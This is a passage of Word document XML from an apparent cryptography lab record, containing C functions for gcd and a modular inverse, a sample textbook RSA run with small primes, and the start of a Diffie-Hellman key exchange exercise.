        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn res;</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i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gcd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">( </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b )</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e ( a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:t>= 0 )</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b % a;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>b = c;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn b;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>veIn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>erse(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">b, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="772" w:right="7092"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>,x,y;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>y&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>y++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>x&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>x++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1540"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>=a*x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b*(-y);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1540"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m=</w:t>
      </w:r>
      <w:r>
        <w:t>=1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1982" w:right="6203"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn x;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>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00"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId24">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rPr>
        <w:t>rs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ben.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId25">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a.out</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>wo pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">bers p and q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">17 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>Ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>(187) = 160</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>eger e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6303"/>
      </w:pPr>
      <w:r>
        <w:t>Pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c Key PU =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>{7,187} Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>R = {23,18</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t>} M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ssage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= 88</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6014"/>
      </w:pPr>
      <w:r>
        <w:t>Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>essage M = 88</w:t>
      </w:r>
      <w:hyperlink r:id="rId26">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pPr>
        <w:ind w:left="100"/>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2794" w:right="715" w:hanging="2694"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 8                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: DI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>FF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IE-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ELL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">AN </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>EY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>EXC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>HA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E</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D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
